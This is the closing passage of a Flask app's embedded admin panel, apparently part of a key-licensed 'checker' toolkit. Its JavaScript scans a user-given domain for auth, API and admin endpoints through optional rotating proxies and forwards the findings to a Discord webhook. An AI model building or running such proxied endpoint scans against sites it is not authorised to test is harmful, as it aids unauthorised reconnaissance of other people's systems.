    fetch("/api/admin/delete", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, target_key: target })})
    .then(function(r){ return r.json(); })
    .then(function(d){
        if (d.success) loadKeys();
        else alert("Silinemedi");
    })
    .catch(function(e){ alert("Hata: " + e.message); });
}

// ============================================================
// API KEŞİF (SADECE ADMIN)
// ============================================================
function updateStatsUI() {
    if (!isAdmin) return;
    document.getElementById("totalCount").innerText = foundEndpoints.length;
    document.getElementById("sideTotal").innerText = foundEndpoints.length;
    var auth = foundEndpoints.filter(function(e){ return e.category === "Auth"; }).length;
    var api = foundEndpoints.filter(function(e){ return e.category === "API"; }).length;
    var admin = foundEndpoints.filter(function(e){ return e.category === "Admin"; }).length;
    document.getElementById("authCount").innerText = auth;
    document.getElementById("apiCount").innerText = api;
    document.getElementById("adminCount").innerText = admin;
    document.getElementById("sideAuth").innerText = auth;
    document.getElementById("sideAPI").innerText = api;
    document.getElementById("sideAdmin").innerText = admin;
    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
}

function startScan() {
    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
    if (scanning) return;
    var domain = document.getElementById("targetDomain").value.trim();
    if (!domain) return alert("Hedef domain girin");
    var btn = document.getElementById("scanBtn");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
    scanning = true;
    foundEndpoints = [];
    document.getElementById("resultsList").innerHTML = "";
    document.getElementById("statusDot").classList.remove("idle");
    document.getElementById("statusText").innerText = "Taranıyor";
    updateStatsUI();

    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
    if (useProxy && proxyList.length) { url += "&proxies=" + encodeURIComponent(proxyList.join(",")); }
    eventSource = new EventSource(url);
    eventSource.onmessage = function(e){
        if (e.data === "[DONE]") {
            eventSource.close();
            btn.disabled = false;
            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
            scanning = false;
            document.getElementById("statusDot").classList.add("idle");
            document.getElementById("statusText").innerText = "Boşta";
            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
            document.getElementById("statLast").innerText = new Date().toLocaleString();
            return;
        }
        try {
            var res = JSON.parse(e.data);
            foundEndpoints.push(res);
            addResultRow(res);
            updateStatsUI();
        } catch (err) {}
    };
    eventSource.onerror = function(){
        eventSource.close();
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
        scanning = false;
        document.getElementById("statusDot").classList.add("idle");
        document.getElementById("statusText").innerText = "Boşta";
    };
}

function addResultRow(res) {
    var list = document.getElementById("resultsList");
    var row = document.createElement("div");
    row.className = "result-row";
    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
    var cc = "cat-" + res.category.toLowerCase();
    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
    if (checked.includes(res.category)) list.appendChild(row);
}

document.getElementById("filterContainer").addEventListener("change", function(){
    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c){ return c.value; });
    var list = document.getElementById("resultsList");
    list.innerHTML = "";
    foundEndpoints.forEach(function(res){
        if (checked.includes(res.category)) {
            var row = document.createElement("div");
            row.className = "result-row";
            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
            var cc = "cat-" + res.category.toLowerCase();
            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
            list.appendChild(row);
        }
    });
});

function sendWebhook() {
    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
    var url = document.getElementById("webhookUrl").value.trim();
    if (!url) return alert("Webhook URL girin");
    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
    if (!categories.length) return alert("En az bir kategori seçin");
    if (!foundEndpoints.length) return alert("Önce tarama yapın");
    fetch("/api/admin/webhook", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })})
    .then(function(r){ return r.json(); })
    .then(function(d){ alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
    .catch(function(e){ alert("Hata: " + e.message); });
}

function exportJSON() {
    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
    if (!foundEndpoints.length) return alert("Veri yok");
    var blob = new Blob([JSON.stringify(foundEndpoints, null, 2)], { type: "application/json" });
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "roda_api_scan.json";
    a.click();
}
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT (Render Free Plan Uyumlu)
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})

    port = int(os.environ.get("PORT", 5000))

    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
    ║     Render Free Plan Uyumlu                                    ║
    ║     http://0.0.0.0:""" + str(port) + """                               ║
    ║     Admin girişi için şifre gizlidir.                         ║
    ║     1 KEY 1 IP - 1 KULLANIM                                  ║
    ║     TÜM CHECKER'LAR EKLENDI (Roda Inbox dahil)              ║
    ║     MAVİ TEMA + KAR TANELERİ                                ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)

    app.run(host="0.0.0.0", port=port, debug=False)
